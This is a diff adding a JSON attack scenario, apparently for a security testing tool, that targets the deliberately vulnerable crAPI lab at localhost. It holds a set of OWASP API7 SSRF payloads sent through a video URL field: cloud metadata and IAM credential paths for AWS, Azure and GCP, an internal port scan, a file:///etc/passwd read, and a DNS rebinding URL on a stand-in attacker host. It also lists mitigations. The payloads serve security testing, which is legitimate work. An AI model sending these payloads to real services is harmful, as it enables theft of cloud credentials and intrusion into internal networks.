@@ -1,0 +1,214 @@
+{
+  "id": "api7-ssrf-cloud-metadata",
+  "name": "API7:2023 - Server-Side Request Forgery (SSRF)",
+  "category": "API Security",
+  "difficulty": "Advanced",
+  "description": "Exploits SSRF vulnerabilities to access cloud metadata services, internal networks, and backend systems not intended for public access",
+  "kind": "scenario",
+  "tags": [
+    "owasp-api-7",
+    "ssrf",
+    "cloud-metadata",
+    "internal-network",
+    "api"
+  ],
+  "target": "http://localhost:8888",
+  "estimatedDuration": "5-8 minutes",
+  "documentation": "https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/",
+  "prerequisites": [
+    "API with URL parameter input (webhook, image fetch, etc.)",
+    "crAPI or vulnerable API with SSRF weakness"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 120,
+      "description": "Identify endpoints accepting URLs or external resources"
+    },
+    {
+      "name": "weaponization",
+      "duration": 240,
+      "description": "Craft SSRF payloads for metadata and internal services"
+    },
+    {
+      "name": "delivery",
+      "duration": 300,
+      "description": "Execute SSRF attacks against internal targets"
+    },
+    {
+      "name": "exploitation",
+      "duration": 360,
+      "description": "Extract sensitive data from cloud metadata and internal services"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "ServerSideRequestForgery",
+      "severity": "Critical",
+      "owasp": "API7:2023 Server Side Request Forgery"
+    },
+    {
+      "classification": "InformationDisclosure",
+      "severity": "High",
+      "cwe": "CWE-918: Server-Side Request Forgery (SSRF)"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "Access to cloud metadata services",
+      "IAM credentials or tokens exposed",
+      "Internal network services enumerated",
+      "Local file system access via file:// protocol",
+      "Backend API or database exposure"
+    ],
+    "indicators": [
+      "Cloud metadata JSON in responses",
+      "AWS/Azure/GCP credentials visible",
+      "Internal IP addresses responding",
+      "File contents from /etc/passwd or similar",
+      "Database connection strings exposed"
+    ]
+  },
+  "mitigations": [
+    "Validate and sanitize all URL inputs",
+    "Use allowlist of permitted domains/protocols",
+    "Disable unused URL schemes (file://, gopher://, etc.)",
+    "Implement network segmentation - block metadata IPs (169.254.169.254)",
+    "Use IMDSv2 for AWS (requires session tokens)",
+    "Add authentication to internal services",
+    "Use egress filtering and firewall rules",
+    "Implement timeout and size limits for external requests",
+    "Use dedicated service accounts with minimal permissions",
+    "Monitor and alert on metadata service access"
+  ],
+  "steps": [
+    {
+      "id": "test-external-url",
+      "name": "Test if API fetches external URLs (baseline)",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "https://httpbin.org/get"
+        }
+      }
+    },
+    {
+      "id": "aws-metadata-v1",
+      "name": "Access AWS EC2 metadata service (IMDSv1)",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "http://169.254.169.254/latest/meta-data/"
+        }
+      }
+    },
+    {
+      "id": "aws-credentials",
+      "name": "Attempt to steal AWS IAM credentials",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        }
+      }
+    },
+    {
+      "id": "azure-metadata",
+      "name": "Access Azure Instance Metadata Service",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+        }
+      }
+    },
+    {
+      "id": "gcp-metadata",
+      "name": "Access Google Cloud metadata service",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "http://metadata.google.internal/computeMetadata/v1/"
+        }
+      }
+    },
+    {
+      "id": "internal-network-scan",
+      "name": "Scan internal network for services",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "http://${INTERNAL_IP}:${PORT}/"
+        }
+      }
+    },
+    {
+      "id": "file-protocol-lfi",
+      "name": "Test file:// protocol for local file inclusion",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "file:///etc/passwd"
+        }
+      }
+    },
+    {
+      "id": "dns-rebinding",
+      "name": "Test DNS rebinding attack vectors",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "http://attacker-controlled-dns.com/rebind-to-internal"
+        }
+      }
+    }
+  ]
+}
